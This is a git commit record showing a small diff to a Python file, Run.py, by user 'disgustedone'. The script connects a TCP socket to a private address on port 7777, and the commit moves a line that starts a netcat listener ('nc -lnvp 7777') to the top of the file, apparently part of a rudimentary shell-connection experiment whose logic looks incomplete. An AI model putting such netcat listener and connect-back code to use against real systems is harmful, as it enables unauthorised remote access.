383c39786e3a0401d987186e05d5ed9cc199374b
disgustedone <58005436+disgustedone@users.noreply.github.com>
2020-10-17 09:33:09 +0200

    Update Run.py

--- Run.py
+++ Run.py
@@ -1,7 +1,10 @@
+import os 
+os.system("nc -lnvp 7777")
+
+
 import socket
 host = '192.168.66.136'
 port = 7777
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect((host,port))
-import os 
-os.system("nc -lnvp 7777")
+
